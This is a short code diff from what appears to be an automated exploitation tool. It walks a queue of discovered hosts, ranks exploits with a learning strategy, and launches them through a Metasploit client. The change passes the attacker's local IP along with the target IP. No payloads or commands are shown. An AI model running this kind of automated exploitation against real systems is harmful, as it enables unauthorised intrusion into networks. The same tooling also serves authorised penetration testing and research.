@@ -104,14 +104,15 @@ def main():
         print("Exploiting...")
         while len(exploitQueue) > 0:
             hostRecord = exploitQueue.pop()
-            hostIp = hostRecord.interfaces[0]
+            localIp = rootHost.interfaces[0]
+            targetIp = hostRecord.interfaces[0]
             hostData = copy.copy(hostRecord.openPorts)
             hostData.insert(0, hostRecord.os)
             # print(hostRecord.toDict()) #debug
             exploitOrder = strategy.search(hostData)
 
             for exploit in exploitOrder:
-                exploitResults = Exploiter.callExploit(msfClient, exploit, hostIp)
+                exploitResults = Exploiter.callExploit(msfClient, exploit, targetIp, localIp)
                 exploitSuccess = exploitResults["job_id"] != None
                 strategy.update(hostData, exploit, exploitSuccess)
                 if exploitSuccess:
